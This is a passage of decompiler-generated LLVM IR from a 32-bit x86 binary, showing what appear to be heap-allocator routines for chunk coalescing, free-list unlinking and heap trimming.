dec_label_pc_8052938:                             ; preds = %dec_label_pc_805291e
  %v1_8052938 = load i32, i32* @ebp, align 4
  %v2_8052938 = add i32 %v1_8052938, %v7_805292b
  store i32 %v2_8052938, i32* @edx, align 4
  %v0_805293b = load i32, i32* @ebx, align 4
  %v1_805293b = or i32 %v0_805293b, 2
  store i32 %v1_805293b, i32* %ebx.global-to-local, align 4
  %v0_805293e = load i32, i32* @esi, align 4
  store i32 %v0_805293e, i32* %eax.global-to-local, align 4
  %v2_8052940 = add i32 %v2_8052938, 4
  %v3_8052940 = inttoptr i32 %v2_8052940 to i32*
  store i32 %v1_805293b, i32* %v3_8052940, align 4
  %v0_8052943 = load i32, i32* %eax.global-to-local, align 4
  %v5_8052943 = sub i32 %v0_8052943, %v1_805274b
  %v1_8052947 = load i32, i32* @global_var_8055c24.44, align 4
  %v2_8052947 = add i32 %v1_8052947, %v5_8052943
  store i32 %v2_8052947, i32* %eax.global-to-local, align 4
  store i32 %v2_8052947, i32* @global_var_8055c24.44, align 4
  %v1_8052952 = load i32, i32* @global_var_8055c30.45, align 16
  %tmp25 = icmp ugt i32 %v2_8052947, %v1_8052952
  br i1 %tmp25, label %dec_label_pc_805295a, label %dec_label_pc_805295f

dec_label_pc_805295a:                             ; preds = %dec_label_pc_8052938
  store i32 %v2_8052947, i32* @global_var_8055c30.45, align 16
  br label %dec_label_pc_805295f

dec_label_pc_805295f:                             ; preds = %dec_label_pc_8052938, %dec_label_pc_805295a
  %v1_805295f = load i32, i32* @global_var_8055c28.46, align 8
  %v2_805295f = add i32 %v1_805295f, %v2_8052947
  store i32 %v2_805295f, i32* %eax.global-to-local, align 4
  %v1_8052965 = load i32, i32* @global_var_8055c34.47, align 4
  %tmp26 = icmp ugt i32 %v2_805295f, %v1_8052965
  br i1 %tmp26, label %dec_label_pc_805296d, label %dec_label_pc_8052972

dec_label_pc_805296d:                             ; preds = %dec_label_pc_805295f
  store i32 %v2_805295f, i32* @global_var_8055c34.47, align 4
  br label %dec_label_pc_8052972

dec_label_pc_8052972:                             ; preds = %dec_label_pc_805295f, %dec_label_pc_805296d
  %v0_8052972 = load i32, i32* @edx, align 4
  %v1_8052972 = add i32 %v0_8052972, 8
  store i32 %v1_8052972, i32* @ebx, align 4
  br label %dec_label_pc_80529c3

dec_label_pc_8052977:                             ; preds = %dec_label_pc_805291e
  %v2_8052977 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8052977, i32* %eax.global-to-local, align 4
  %v10_805297a = icmp ult i32 %v1_805274b, %v2_8052977
  %v1_805297e = icmp eq i1 %v10_805297a, false
  br i1 %v1_805297e, label %dec_label_pc_80529bf, label %dec_label_pc_8052980

dec_label_pc_8052980:                             ; preds = %dec_label_pc_8052977
  %v1_8052987 = add i32 %.v1_8052738, -7
  store i32 %v1_8052987, i32* %eax.global-to-local, align 4
  store i32 %v1_8052987, i32* %stack_var_-60, align 4
  %v1_805298b = call i32 @function_8051e4e(i32 %v1_8052987)
  store i32 %v1_805298b, i32* %eax.global-to-local, align 4
  store i32 %v1_805298b, i32* @ebx, align 4
  %v1_8052995 = icmp eq i32 %v1_805298b, 0
  br i1 %v1_8052995, label %dec_label_pc_80529bb, label %dec_label_pc_8052999

dec_label_pc_8052999:                             ; preds = %dec_label_pc_8052980
  %v1_805299e = add i32 %v1_805274b, -8
  store i32 %v1_805299e, i32* %eax.global-to-local, align 4
  store i32 %v1_805298b, i32* %stack_var_-60, align 4
  %v3_80529a7 = inttoptr i32 %v1_805298b to i16*
  %v4_80529a7 = call i32 @function_8053c3a(i16* %v3_80529a7, i32 %tmp6, i32 %v1_805299e)
  store i32 %v4_80529a7, i32* %eax.global-to-local, align 4
  store i32 %v1_805298b, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_80529b1 = call i32 @function_8052c13(i32 %tmp6)
  br label %dec_label_pc_80529b6

dec_label_pc_80529b6:                             ; preds = %dec_label_pc_8052886, %dec_label_pc_8052999
  %storemerge = phi i32 [ %v1_80529b1, %dec_label_pc_8052999 ], [ %v1_8052890, %dec_label_pc_8052886 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529c3

dec_label_pc_80529bb:                             ; preds = %dec_label_pc_8052980, %dec_label_pc_80527ea
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80529c3

dec_label_pc_80529bf:                             ; preds = %dec_label_pc_8052977, %dec_label_pc_80528ef, %dec_label_pc_8052789
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_80529c3

dec_label_pc_80529c3:                             ; preds = %dec_label_pc_80529bb, %dec_label_pc_80529b6, %dec_label_pc_8052972, %dec_label_pc_80528e7, %dec_label_pc_80529bf
  store i32 %v2_80526f8, i32* @eax, align 4
  store i32 %v2_80526f8, i32* %stack_var_-60, align 4
  %v2_80529cc = call i32 @function_805337a(i32 %v2_80526f8, i32 1)
  store i32 %v2_80529cc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529d1

dec_label_pc_80529d1:                             ; preds = %dec_label_pc_80526dc, %dec_label_pc_80526c8, %dec_label_pc_80529c3
  br label %dec_label_pc_80529d4

dec_label_pc_80529d4:                             ; preds = %dec_label_pc_8052716, %dec_label_pc_80529d1
  %v0_80529d7 = load i32, i32* @ebx, align 4
  store i32 %v0_80529d7, i32* %eax.global-to-local, align 4
  store i32 %v0_80526b9, i32* @ebx, align 4
  store i32 %v0_80526b8, i32* @esi, align 4
  store i32 %v0_80526b7, i32* @edi, align 4
  store i32 %v0_80526b6, i32* @ebp, align 4
  ret i32 %v0_80529d7

; uselistorder directives
  uselistorder i32 %v1_805298b, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_805295f, { 1, 0, 2 }
  uselistorder i32 %v2_8052947, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8052925, { 1, 0, 2 }
  uselistorder i32 %v1_8052900, { 1, 0, 2 }
  uselistorder i32 %v3_80528fd, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80528bb, { 1, 0 }
  uselistorder i32 %v1_8052821, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_80527f5, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8052799, { 1, 0, 2 }
  uselistorder i32 %v3_80527ac, { 0, 2, 1 }
  uselistorder i32 %v2_8052769, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_805274b, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8052743, { 1, 2, 0, 3 }
  uselistorder i32 %.v1_8052738, { 4, 12, 0, 1, 7, 8, 9, 2, 11, 3, 10, 5, 6 }
  uselistorder i32 %v1_8052728, { 0, 2, 1 }
  uselistorder i32 %v0_8052711, { 1, 0 }
  uselistorder i32 %v2_80526f8, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 50, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 37, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 -32, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @function_8052c13, { 8, 7, 6, 5, 4, 0, 10, 9, 2, 1, 11, 3 }
  uselistorder i32 (i32)* @function_8051e4e, { 5, 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80529d4, { 1, 0 }
  uselistorder label %dec_label_pc_80529d1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80529c3, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80529b6, { 1, 0 }
  uselistorder label %dec_label_pc_8052972, { 1, 0 }
  uselistorder label %dec_label_pc_805295f, { 1, 0 }
  uselistorder label %dec_label_pc_80528e7, { 1, 0 }
  uselistorder label %dec_label_pc_805289a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052886, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80527df, { 1, 0 }
}

define i32 @function_80529de() local_unnamed_addr {
dec_label_pc_80529de:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_80529e5 = load i32, i32* @edx, align 4
  store i32 %v0_80529e5, i32* %ebp.global-to-local, align 4
  %v1_80529e7 = add i32 %v0_80529e5, 860
  %v2_80529e7 = inttoptr i32 %v1_80529e7 to i32*
  %v3_80529e7 = load i32, i32* %v2_80529e7, align 4
  store i32 %v3_80529e7, i32* %ecx.global-to-local, align 4
  %v1_80529ed = add i32 %v0_80529e5, 44
  %v2_80529ed = inttoptr i32 %v1_80529ed to i32*
  %v3_80529ed = load i32, i32* %v2_80529ed, align 4
  %v1_80529f0 = add i32 %v3_80529ed, 4
  %v2_80529f0 = inttoptr i32 %v1_80529f0 to i32*
  %v3_80529f0 = load i32, i32* %v2_80529f0, align 4
  %v1_80529f3 = and i32 %v3_80529f0, -4
  store i32 %v1_80529f3, i32* @esi, align 4
  %v1_80529f8 = load i32, i32* @eax, align 4
  %v2_80529f8 = add i32 %v3_80529e7, -17
  %v2_80529fa = add i32 %v2_80529f8, %v1_80529f3
  %v3_80529fa = sub i32 %v2_80529fa, %v1_80529f8
  %div = udiv i32 %v3_80529fa, %v3_80529e7
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_80529fa, %v3_80529e7
  store i32 %tmp10, i32* @edx, align 4
  %v1_8052a02 = add i32 %div, -1
  %v4_8052a05 = mul i32 %v1_8052a02, %v3_80529e7
  store i32 %v4_8052a05, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8052a05, 1
  br i1 %tmp11, label %dec_label_pc_8052a63, label %dec_label_pc_8052a0c

dec_label_pc_8052a0c:                             ; preds = %dec_label_pc_80529de
  %v1_8052a11 = call i32 @function_8053b41(i32 0)
  store i32 %v1_8052a11, i32* %edi.global-to-local, align 4
  %v0_8052a18 = load i32, i32* @esi, align 4
  store i32 %v0_8052a18, i32* %eax.global-to-local, align 4
  %v1_8052a1a = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052a1a = add i32 %v1_8052a1a, 44
  %v3_8052a1a = inttoptr i32 %v2_8052a1a to i32*
  %v4_8052a1a = load i32, i32* %v3_8052a1a, align 4
  %v5_8052a1a = add i32 %v4_8052a1a, %v0_8052a18
  store i32 %v5_8052a1a, i32* %eax.global-to-local, align 4
  %v12_8052a20 = icmp eq i32 %v1_8052a11, %v5_8052a1a
  %v1_8052a22 = icmp eq i1 %v12_8052a20, false
  br i1 %v1_8052a22, label %dec_label_pc_8052a63, label %dec_label_pc_8052a24

dec_label_pc_8052a24:                             ; preds = %dec_label_pc_8052a0c
  %v1_8052a27 = sub i32 0, %v4_8052a05
  store i32 %v1_8052a27, i32* @ebx, align 4
  %v1_8052a2a = call i32 @function_8053b41(i32 %v1_8052a27)
  store i32 %v1_8052a2a, i32* %eax.global-to-local, align 4
  %v1_8052a36 = call i32 @function_8053b41(i32 0)
  store i32 %v1_8052a36, i32* %eax.global-to-local, align 4
  %v10_8052a3e = icmp eq i32 %v1_8052a36, -1
  br i1 %v10_8052a3e, label %dec_label_pc_8052a63, label %dec_label_pc_8052a43

dec_label_pc_8052a43:                             ; preds = %dec_label_pc_8052a24
  %v0_8052a43 = load i32, i32* %edi.global-to-local, align 4
  %v2_8052a45 = sub i32 %v0_8052a43, %v1_8052a36
  %v12_8052a45 = icmp eq i32 %v2_8052a45, 0
  store i32 %v2_8052a45, i32* %ecx.global-to-local, align 4
  br i1 %v12_8052a45, label %dec_label_pc_8052a63, label %dec_label_pc_8052a49

dec_label_pc_8052a49:                             ; preds = %dec_label_pc_8052a43
  %v0_8052a49 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052a49 = add i32 %v0_8052a49, 44
  %v2_8052a49 = inttoptr i32 %v1_8052a49 to i32*
  %v3_8052a49 = load i32, i32* %v2_8052a49, align 4
  store i32 %v3_8052a49, i32* %eax.global-to-local, align 4
  %v1_8052a4c = add i32 %v0_8052a49, 872
  %v2_8052a4c = inttoptr i32 %v1_8052a4c to i32*
  %v3_8052a4c = load i32, i32* %v2_8052a4c, align 4
  %v5_8052a4c = sub i32 %v3_8052a4c, %v2_8052a45
  store i32 %v5_8052a4c, i32* %v2_8052a4c, align 4
  %v0_8052a52 = load i32, i32* @esi, align 4
  %v1_8052a52 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052a52 = sub i32 %v0_8052a52, %v1_8052a52
  %v1_8052a54 = or i32 %v2_8052a52, 1
  %v1_8052a57 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a57 = add i32 %v1_8052a57, 4
  %v3_8052a57 = inttoptr i32 %v2_8052a57 to i32*
  store i32 %v1_8052a54, i32* %v3_8052a57, align 4
  br label %dec_label_pc_8052a63

dec_label_pc_8052a63:                             ; preds = %dec_label_pc_80529de, %dec_label_pc_8052a0c, %dec_label_pc_8052a24, %dec_label_pc_8052a43, %dec_label_pc_8052a49
  %storemerge = phi i32 [ 1, %dec_label_pc_8052a49 ], [ 0, %dec_label_pc_8052a43 ], [ 0, %dec_label_pc_8052a24 ], [ 0, %dec_label_pc_8052a0c ], [ 0, %dec_label_pc_80529de ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052a36, { 1, 0, 2 }
  uselistorder i32 %v4_8052a05, { 1, 2, 0 }
  uselistorder i32 %v3_80529e7, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8053b41, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052a63, { 4, 3, 2, 1, 0 }
}

define i32 @function_8052a6b(i32* %arg1) local_unnamed_addr {
dec_label_pc_8052a6b:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_8052a6c = load i32, i32* @edi, align 4
  %v0_8052a6d = load i32, i32* @esi, align 4
  %v0_8052a6e = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_8052a76 = load i32, i32* %arg1, align 4
  store i32 %v2_8052a76, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8052a7d = icmp eq i32 %v2_8052a76, 0
  br i1 %v1_8052a7d, label %dec_label_pc_8052b97.lr.ph, label %dec_label_pc_8052a85

dec_label_pc_8052b97.lr.ph:                       ; preds = %dec_label_pc_8052a6b
  %v3_8052b9b = add i32 %tmp20, 44
  br label %dec_label_pc_8052b97

dec_label_pc_8052a85:                             ; preds = %dec_label_pc_8052a6b
  %v1_8052a89 = and i32 %v2_8052a76, -3
  store i32 %v1_8052a89, i32* %arg1, align 4
  %v1_8052a8e = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_8052a99 = add i32 %tmp20, 4
  store i32 %v1_8052a99, i32* %eax.global-to-local, align 4
  %v2_8052aa4 = load i32, i32* %arg1, align 4
  %v2_8052aaa = udiv i32 %v2_8052aa4, 8
  %v2_8052aad = mul nuw i32 %v2_8052aaa, 4
  %v3_8052aad = add i32 %tmp20, -4
  %v4_8052aad = add i32 %v3_8052aad, %v2_8052aad
  store i32 %v4_8052aad, i32* %eax.global-to-local, align 4
  %v2_8052b74 = add i32 %tmp20, 44
  %v3_8052b74 = inttoptr i32 %v2_8052b74 to i32*
  %v1_8052b47 = add i32 %tmp20, 60
  %v2_8052b47 = inttoptr i32 %v1_8052b47 to i32*
  br label %dec_label_pc_8052ab5

dec_label_pc_8052ab5:                             ; preds = %dec_label_pc_8052b83, %dec_label_pc_8052a85
  %v0_8052ac3 = phi i32 [ %v1_8052a99, %dec_label_pc_8052a85 ], [ %v4_8052b8d, %dec_label_pc_8052b83 ]
  store i32 %v0_8052ac3, i32* %eax.global-to-local, align 4
  %v1_8052ab9 = inttoptr i32 %v0_8052ac3 to i32*
  %v2_8052ab9 = load i32, i32* %v1_8052ab9, align 4
  store i32 %v2_8052ab9, i32* @ecx, align 4
  %v1_8052abb = icmp eq i32 %v2_8052ab9, 0
  br i1 %v1_8052abb, label %dec_label_pc_8052b83, label %dec_label_pc_8052ac3

dec_label_pc_8052ac3:                             ; preds = %dec_label_pc_8052ab5
  store i32 0, i32* %v1_8052ab9, align 4
  %v0_8052ac9.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052ac9

dec_label_pc_8052ac9:                             ; preds = %dec_label_pc_8052b77, %dec_label_pc_8052ac3
  %v0_8052ae6 = phi i32 [ %v3_8052ac9, %dec_label_pc_8052b77 ], [ %v0_8052ac9.pre, %dec_label_pc_8052ac3 ]
  %v1_8052ac9 = add i32 %v0_8052ae6, 8
  %v2_8052ac9 = inttoptr i32 %v1_8052ac9 to i32*
  %v3_8052ac9 = load i32, i32* %v2_8052ac9, align 4
  store i32 %v3_8052ac9, i32* %edx.global-to-local, align 4
  %v1_8052ad0 = add i32 %v0_8052ae6, 4
  %v2_8052ad0 = inttoptr i32 %v1_8052ad0 to i32*
  %v3_8052ad0 = load i32, i32* %v2_8052ad0, align 4
  store i32 %v3_8052ad0, i32* %eax.global-to-local, align 4
  %v1_8052ad5 = and i32 %v3_8052ad0, -2
  store i32 %v1_8052ad5, i32* @edi, align 4
  %v2_8052ad8 = urem i32 %v3_8052ad0, 2
  %v3_8052ad8 = icmp eq i32 %v2_8052ad8, 0
  %v2_8052ada = add i32 %v1_8052ad5, %v0_8052ae6
  store i32 %v2_8052ada, i32* @ebx, align 4
  %v1_8052add = add i32 %v2_8052ada, 4
  %v2_8052add = inttoptr i32 %v1_8052add to i32*
  %v3_8052add = load i32, i32* %v2_8052add, align 4
  store i32 %v3_8052add, i32* %edx.global-to-local, align 4
  %v1_8052ae4 = icmp eq i1 %v3_8052ad8, false
  br i1 %v1_8052ae4, label %dec_label_pc_8052b06, label %dec_label_pc_8052ae6

dec_label_pc_8052ae6:                             ; preds = %dec_label_pc_8052ac9
  %v1_8052ae6 = inttoptr i32 %v0_8052ae6 to i32*
  %v2_8052ae6 = load i32, i32* %v1_8052ae6, align 4
  store i32 %v2_8052ae6, i32* %ebp.global-to-local, align 4
  %v2_8052aea = sub i32 %v0_8052ae6, %v2_8052ae6
  store i32 %v2_8052aea, i32* %eax.global-to-local, align 4
  %v1_8052aec = add i32 %v2_8052aea, 8
  %v2_8052aec = inttoptr i32 %v1_8052aec to i32*
  %v3_8052aec = load i32, i32* %v2_8052aec, align 4
  store i32 %v3_8052aec, i32* @esi, align 4
  %v1_8052aef = add i32 %v2_8052aea, 12
  %v2_8052aef = inttoptr i32 %v1_8052aef to i32*
  %v3_8052aef = load i32, i32* %v2_8052aef, align 4
  store i32 %v3_8052aef, i32* %edx.global-to-local, align 4
  %v1_8052af2 = add i32 %v3_8052aec, 12
  %v2_8052af2 = inttoptr i32 %v1_8052af2 to i32*
  %v3_8052af2 = load i32, i32* %v2_8052af2, align 4
  store i32 %v3_8052af2, i32* @ecx, align 4
  %v12_8052af5 = icmp eq i32 %v3_8052af2, %v2_8052aea
  %v1_8052af7 = icmp eq i1 %v12_8052af5, false
  br i1 %v1_8052af7, label %dec_label_pc_8052b36, label %dec_label_pc_8052af9

dec_label_pc_8052af9:                             ; preds = %dec_label_pc_8052ae6
  %v1_8052af9 = add i32 %v3_8052aef, 8
  %v2_8052af9 = inttoptr i32 %v1_8052af9 to i32*
  %v3_8052af9 = load i32, i32* %v2_8052af9, align 4
  %v15_8052af9 = icmp eq i32 %v3_8052af9, %v3_8052af2
  %v1_8052afc = icmp eq i1 %v15_8052af9, false
  br i1 %v1_8052afc, label %dec_label_pc_8052b36, label %dec_label_pc_8052afe

dec_label_pc_8052afe:                             ; preds = %dec_label_pc_8052af9
  %v2_8052afe = add i32 %v2_8052ae6, %v1_8052ad5
  store i32 %v2_8052afe, i32* @edi, align 4
  store i32 %v3_8052aef, i32* %v2_8052af2, align 4
  %v0_8052b03 = load i32, i32* @esi, align 4
  %v1_8052b03 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052b03 = add i32 %v1_8052b03, 8
  %v3_8052b03 = inttoptr i32 %v2_8052b03 to i32*
  store i32 %v0_8052b03, i32* %v3_8052b03, align 4
  %v0_8052b11.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052b06

dec_label_pc_8052b06:                             ; preds = %dec_label_pc_8052ac9, %dec_label_pc_8052afe
  %v1_8052b1a = phi i32 [ %v2_8052ada, %dec_label_pc_8052ac9 ], [ %v0_8052b11.pre, %dec_label_pc_8052afe ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8052b0e = and i32 %v3_8052add, -4
  store i32 %v1_8052b0e, i32* %ebp.global-to-local, align 4
  %v4_8052b11 = load i32, i32* %v3_8052b74, align 4
  %v15_8052b11 = icmp eq i32 %v1_8052b1a, %v4_8052b11
  br i1 %v15_8052b11, label %dec_label_pc_8052b67, label %dec_label_pc_8052b16

dec_label_pc_8052b16:                             ; preds = %dec_label_pc_8052b06
  %v2_8052b16 = add i32 %v1_8052b1a, 4
  %v3_8052b16 = add i32 %v2_8052b16, %v1_8052b0e
  %v4_8052b16 = inttoptr i32 %v3_8052b16 to i32*
  %v5_8052b16 = load i32, i32* %v4_8052b16, align 4
  store i32 %v5_8052b16, i32* %eax.global-to-local, align 4
  %v3_8052b1a = inttoptr i32 %v2_8052b16 to i32*
  store i32 %v1_8052b0e, i32* %v3_8052b1a, align 4
  %v0_8052b1d = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b1d = urem i32 %v0_8052b1d, 2
  %v2_8052b1d = icmp eq i32 %v1_8052b1d, 0
  store i32 %v1_8052b1d, i32* %eax.global-to-local, align 4
  %v1_8052b22 = icmp eq i1 %v2_8052b1d, false
  br i1 %v1_8052b22, label %dec_label_pc_8052b43, label %dec_label_pc_8052b24

dec_label_pc_8052b24:                             ; preds = %dec_label_pc_8052b16
  %v0_8052b24 = load i32, i32* @ebx, align 4
  %v1_8052b24 = add i32 %v0_8052b24, 8
  %v2_8052b24 = inttoptr i32 %v1_8052b24 to i32*
  %v3_8052b24 = load i32, i32* %v2_8052b24, align 4
  store i32 %v3_8052b24, i32* @edx, align 4
  %v1_8052b27 = add i32 %v0_8052b24, 12
  %v2_8052b27 = inttoptr i32 %v1_8052b27 to i32*
  %v3_8052b27 = load i32, i32* %v2_8052b27, align 4
  store i32 %v3_8052b27, i32* %eax.global-to-local, align 4
  %v1_8052b2a = add i32 %v3_8052b24, 12
  %v2_8052b2a = inttoptr i32 %v1_8052b2a to i32*
  %v3_8052b2a = load i32, i32* %v2_8052b2a, align 4
  store i32 %v3_8052b2a, i32* @esi, align 4
  %v12_8052b2d = icmp eq i32 %v3_8052b2a, %v0_8052b24
  %v1_8052b2f = icmp eq i1 %v12_8052b2d, false
  br i1 %v1_8052b2f, label %dec_label_pc_8052b36, label %dec_label_pc_8052b31

dec_label_pc_8052b31:                             ; preds = %dec_label_pc_8052b24
  %v1_8052b31 = add i32 %v3_8052b27, 8
  %v2_8052b31 = inttoptr i32 %v1_8052b31 to i32*
  %v3_8052b31 = load i32, i32* %v2_8052b31, align 4
  %v15_8052b31 = icmp eq i32 %v3_8052b31, %v3_8052b2a
  br i1 %v15_8052b31, label %dec_label_pc_8052b3b, label %dec_label_pc_8052b36

dec_label_pc_8052b36:                             ; preds = %dec_label_pc_8052b31, %dec_label_pc_8052b24, %dec_label_pc_8052af9, %dec_label_pc_8052ae6
  %v0_8052b36 = call i32 @function_8052daf()
  store i32 %v0_8052b36, i32* %eax.global-to-local, align 4
  %v1_8052b3d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052b3b

dec_label_pc_8052b3b:                             ; preds = %dec_label_pc_8052b31, %dec_label_pc_8052b36
  %v1_8052b3d = phi i32 [ %v3_8052b24, %dec_label_pc_8052b31 ], [ %v1_8052b3d.pre, %dec_label_pc_8052b36 ]
  %v0_8052b3d = phi i32 [ %v3_8052b27, %dec_label_pc_8052b31 ], [ %v0_8052b36, %dec_label_pc_8052b36 ]
  %v0_8052b3b = load i32, i32* @edi, align 4
  %v1_8052b3b = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052b3b = add i32 %v1_8052b3b, %v0_8052b3b
  store i32 %v2_8052b3b, i32* @edi, align 4
  %v2_8052b3d = add i32 %v1_8052b3d, 12
  %v3_8052b3d = inttoptr i32 %v2_8052b3d to i32*
  store i32 %v0_8052b3d, i32* %v3_8052b3d, align 4
  %v0_8052b40 = load i32, i32* @edx, align 4
  %v1_8052b40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052b40 = add i32 %v1_8052b40, 8
  %v3_8052b40 = inttoptr i32 %v2_8052b40 to i32*
  store i32 %v0_8052b40, i32* %v3_8052b40, align 4
  br label %dec_label_pc_8052b43

dec_label_pc_8052b43:                             ; preds = %dec_label_pc_8052b16, %dec_label_pc_8052b3b
  store i32 %v1_8052a8e, i32* %eax.global-to-local, align 4
  %v3_8052b47 = load i32, i32* %v2_8052b47, align 4
  store i32 %v3_8052b47, i32* @edx, align 4
  %v0_8052b4a = load i32, i32* @ecx, align 4
  store i32 %v0_8052b4a, i32* %v2_8052b47, align 4
  %v0_8052b4d = load i32, i32* @edi, align 4
  %v1_8052b4f = or i32 %v0_8052b4d, 1
  store i32 %v1_8052b4f, i32* %eax.global-to-local, align 4
  %v0_8052b52 = load i32, i32* @ecx, align 4
  %v1_8052b52 = load i32, i32* @edx, align 4
  %v2_8052b52 = add i32 %v1_8052b52, 12
  %v3_8052b52 = inttoptr i32 %v2_8052b52 to i32*
  store i32 %v0_8052b52, i32* %v3_8052b52, align 4
  %v0_8052b55 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b55 = load i32, i32* @ecx, align 4
  %v2_8052b55 = add i32 %v1_8052b55, 4
  %v3_8052b55 = inttoptr i32 %v2_8052b55 to i32*
  store i32 %v0_8052b55, i32* %v3_8052b55, align 4
  store i32 %v1_8052a8e, i32* %eax.global-to-local, align 4
  %v0_8052b5c = load i32, i32* @edx, align 4
  %v1_8052b5c = load i32, i32* @ecx, align 4
  %v2_8052b5c = add i32 %v1_8052b5c, 8
  %v3_8052b5c = inttoptr i32 %v2_8052b5c to i32*
  store i32 %v0_8052b5c, i32* %v3_8052b5c, align 4
  %v0_8052b5f = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b5f = load i32, i32* @ecx, align 4
  %v2_8052b5f = add i32 %v1_8052b5f, 12
  %v3_8052b5f = inttoptr i32 %v2_8052b5f to i32*
  store i32 %v0_8052b5f, i32* %v3_8052b5f, align 4
  %v0_8052b62 = load i32, i32* @edi, align 4
  %v1_8052b62 = load i32, i32* @ecx, align 4
  %v3_8052b62 = add i32 %v1_8052b62, %v0_8052b62
  %v4_8052b62 = inttoptr i32 %v3_8052b62 to i32*
  store i32 %v0_8052b62, i32* %v4_8052b62, align 4
  br label %dec_label_pc_8052b77

dec_label_pc_8052b67:                             ; preds = %dec_label_pc_8052b06
  %v0_8052b67 = load i32, i32* @edi, align 4
  %v2_8052b67 = add i32 %v0_8052b67, %v1_8052b0e
  %v1_8052b6a = or i32 %v2_8052b67, 1
  store i32 %v1_8052b6a, i32* %eax.global-to-local, align 4
  %v1_8052b6d = load i32, i32* @ecx, align 4
  %v2_8052b6d = add i32 %v1_8052b6d, 4
  %v3_8052b6d = inttoptr i32 %v2_8052b6d to i32*
  store i32 %v1_8052b6a, i32* %v3_8052b6d, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_8052b74 = load i32, i32* @ecx, align 4
  store i32 %v0_8052b74, i32* %v3_8052b74, align 4
  br label %dec_label_pc_8052b77

dec_label_pc_8052b77:                             ; preds = %dec_label_pc_8052b43, %dec_label_pc_8052b67
  store i32 %v3_8052ac9, i32* @ecx, align 4
  %v1_8052b7b = icmp eq i32 %v3_8052ac9, 0
  %v1_8052b7d = icmp eq i1 %v1_8052b7b, false
  br i1 %v1_8052b7d, label %dec_label_pc_8052ac9, label %dec_label_pc_8052b83

dec_label_pc_8052b83:                             ; preds = %dec_label_pc_8052b77, %dec_label_pc_8052ab5
  %v15_8052b87 = icmp eq i32 %v0_8052ac3, %v4_8052aad
  %v4_8052b8d = add i32 %v0_8052ac3, 4
  br i1 %v15_8052b87, label %dec_label_pc_8052c0b, label %dec_label_pc_8052ab5

dec_label_pc_8052b97:                             ; preds = %dec_label_pc_8052b97.lr.ph, %dec_label_pc_8052b97
  %v1_8052b9b = phi i32 [ 1, %dec_label_pc_8052b97.lr.ph ], [ %v0_8052ba6, %dec_label_pc_8052b97 ]
  %v2_8052b9b = mul i32 %v1_8052b9b, 8
  %v4_8052b9b = add i32 %v3_8052b9b, %v2_8052b9b
  store i32 %v4_8052b9b, i32* %eax.global-to-local, align 4
  %v1_8052b9f = add i32 %v1_8052b9b, 1
  store i32 %v1_8052b9f, i32* %edx.global-to-local, align 4
  %v2_8052ba0 = add i32 %v4_8052b9b, 12
